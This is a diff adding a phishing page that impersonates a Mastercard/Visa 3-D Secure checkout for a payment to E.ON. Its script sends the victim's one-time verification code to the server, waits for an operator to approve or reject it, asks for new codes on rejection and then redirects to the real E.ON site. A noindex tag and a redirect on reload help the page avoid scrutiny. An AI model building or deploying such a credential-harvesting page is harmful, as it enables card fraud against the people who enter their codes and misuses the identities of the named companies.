@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify Payment</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #e5e7eb; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .mobile-frame { width: 375px; height: 812px; background-color: #f9fafb; border-radius: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; }
+        .screen-content { background-color: white; flex-grow: 1; display: flex; flex-direction: column; }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-frame">
+        <div id="screen" class="screen-content">
+            <header class="bg-yellow-500 text-gray-800 p-4 flex justify-between items-center">
+                <h1 class="font-bold text-lg">Secure Checkout</h1>
+                <a href="final_payment.html" class="font-semibold">CANCEL</a>
+            </header>
+            <main class="p-6 flex-grow">
+                <div class="flex justify-between items-center mb-6 pb-4 border-b">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/2560px-Mastercard_2019_logo.svg.png" alt="Mastercard SecureCode Logo" class="h-10">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Verified by Visa Logo" class="h-8">
+                </div>
+                <div class="text-center mb-6">
+                    <p class="text-sm text-gray-500">Amount to be paid to E.ON</p>
+                    <p id="otp-amount" class="text-3xl font-bold text-gray-800">0.00 EUR</p>
+                </div>
+                <h2 class="text-xl font-bold mb-2">Verify by phone</h2>
+                <p class="text-gray-600 mb-4">Please enter the code below to complete your payment.</p>
+                <form id="otp-form">
+                    <div>
+                        <label for="verification-code" class="sr-only">Verification code</label>
+                        <input type="text" id="verification-code" placeholder="123456" class="w-full text-center text-2xl p-3 border-b-2 border-blue-600 focus:outline-none" style="letter-spacing: 0.5em;" required>
+                    </div>
+                    <!-- Added a placeholder for the error message -->
+                    <p id="error-message" class="text-red-500 text-center text-sm mt-2 h-5"></p>
+                    <button type="submit" id="confirm-btn" class="w-full bg-gray-400 text-white font-bold py-4 px-4 rounded-md mt-6 cursor-not-allowed" disabled>
+                        CONFIRM CODE
+                    </button>
+                </form>
+                <p class="text-center text-sm text-gray-500 mt-6">
+                    Didn't receive it? <a href="#" class="font-semibold text-blue-600">Resend</a>
+                </p>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const otpAmountEl = document.getElementById('otp-amount');
+            const screen = document.getElementById('screen');
+            const confirmBtn = document.getElementById('confirm-btn');
+            const otpForm = document.getElementById('otp-form');
+            const verificationCodeInput = document.getElementById('verification-code');
+            const errorMessage = document.getElementById('error-message');
+            
+            const submissionId = localStorage.getItem('submissionId');
+            if (!submissionId) {
+                screen.innerHTML = `<div class="flex-grow flex flex-col items-center justify-center p-8"><h1 class="text-xl font-bold text-red-600">Error: No submission ID found.</h1><p>Please start the process over.</p></div>`;
+                return;
+            }
+
+            const submissionDataString = localStorage.getItem('adminSubmission');
+            if (submissionDataString) {
+                const submission = JSON.parse(submissionDataString);
+                otpAmountEl.textContent = `${submission.totalAmount} EUR`;
+            }
+            
+            verificationCodeInput.addEventListener('input', () => {
+                errorMessage.textContent = ''; // Clear error on new input
+                if (verificationCodeInput.value.trim() !== '') {
+                    confirmBtn.disabled = false;
+                    confirmBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+                    confirmBtn.classList.add('bg-blue-700', 'hover:bg-blue-800');
+                } else {
+                    confirmBtn.disabled = true;
+                    confirmBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                    confirmBtn.classList.remove('bg-blue-700', 'hover:bg-blue-800');
+                }
+            });
+            
+            async function checkAdminStatus() {
+                try {
+                    const response = await fetch(`/get-status/${submissionId}`);
+                    const data = await response.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(statusInterval);
+                        screen.innerHTML = `
+                            <div class="flex-grow flex flex-col items-center justify-center p-8 text-center">
+                                <div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center">
+                                    <svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                                </div>
+                                <h1 class="text-3xl font-bold mt-6">Payment Successful!</h1>
+                                <p class="mt-2 text-gray-600">You will be redirected to the official site in <span id="countdown">5</span> seconds...</p>
+                                <a href="https://www.eon.de/de/pk.html" class="mt-8 bg-gray-200 text-gray-800 font-bold py-2 px-4 rounded">Go to Homepage Now</a>
+                            </div>`;
+
+                        let seconds = 5;
+                        const countdownEl = document.getElementById('countdown');
+                        const redirectTimer = setInterval(() => {
+                            seconds--;
+                            countdownEl.textContent = seconds;
+                            if (seconds <= 0) {
+                                clearInterval(redirectTimer);
+                                window.location.href = 'https://www.eon.de/de/pk.html';
+                            }
+                        }, 1000);
+
+                    } else if (data.status === 'rejected') {
+                        clearInterval(statusInterval);
+                        // Show "Wrong code" message and reset the form
+                        errorMessage.textContent = 'Wrong code. Please try again.';
+                        verificationCodeInput.value = '';
+                        confirmBtn.disabled = false;
+                        confirmBtn.textContent = 'CONFIRM CODE';
+                        confirmBtn.classList.add('bg-blue-700', 'hover:bg-blue-800');
+                        confirmBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
+                        // Tell the server to reset the status so we can try again
+                        resetStatusOnServer();
+                    }
+                } catch (error) {
+                    console.log("Waiting for server response...");
+                }
+            }
+
+            async function resetStatusOnServer() {
+                try {
+                    await fetch('/update-status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: submissionId, status: 'pending', otp: null }), // Reset status and clear OTP
+                    });
+                } catch (error) {
+                    console.error("Failed to reset status:", error);
+                }
+            }
+
+            let statusInterval;
+
+            otpForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                confirmBtn.disabled = true;
+                confirmBtn.textContent = 'VERIFYING...';
+                errorMessage.textContent = '';
+                
+                try {
+                    await fetch('/update-status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: submissionId, otp: verificationCodeInput.value }),
+                    });
+                } catch (error) {
+                    console.error("Failed to send OTP:", error);
+                    alert("Could not send verification code. Please try again.");
+                }
+
+                statusInterval = setInterval(checkAdminStatus, 2000);
+            });
+        });
+    </script>
+    <script>
+      // Modern API to detect reload
+      if (performance.getEntriesByType("navigation")[0].type === "reload") {
+          window.location.href = "https://www.eon.de/de/pk.html";
+      }
+    </script>
+
+</body>
+</html>
